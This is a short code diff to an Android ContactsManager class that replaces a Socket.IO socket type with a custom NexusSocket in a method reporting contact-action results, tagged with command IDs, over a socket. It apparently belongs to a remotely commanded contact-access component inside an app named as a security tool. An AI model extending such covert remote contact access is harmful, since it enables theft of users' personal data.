@@ -14,11 +14,11 @@ import android.provider.ContactsContract.RawContacts;
 import com.seguranca.protecao.AppCoreInitializer;
 import com.seguranca.protecao.core.Protocol;
 import com.seguranca.protecao.core.SocketClient;
+import com.seguranca.protecao.core.NexusSocket;
 import com.seguranca.protecao.PermissionManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.util.ArrayList;
-import io.socket.client.Socket;
 
 public final class ContactsManager {
     private static final int MAX = 500;
@@ -184,7 +184,7 @@ public final class ContactsManager {
 
     private static void sendResult(String action, boolean success, String error, String cmdId) {
         try {
-            Socket socket = SocketClient.getInstance().getSocket();
+            NexusSocket socket = SocketClient.getInstance().getSocket();
             if (socket == null) return;
             JSONObject r = new JSONObject();
             r.put(Protocol.KEY_TYPE, "contact_action_result");
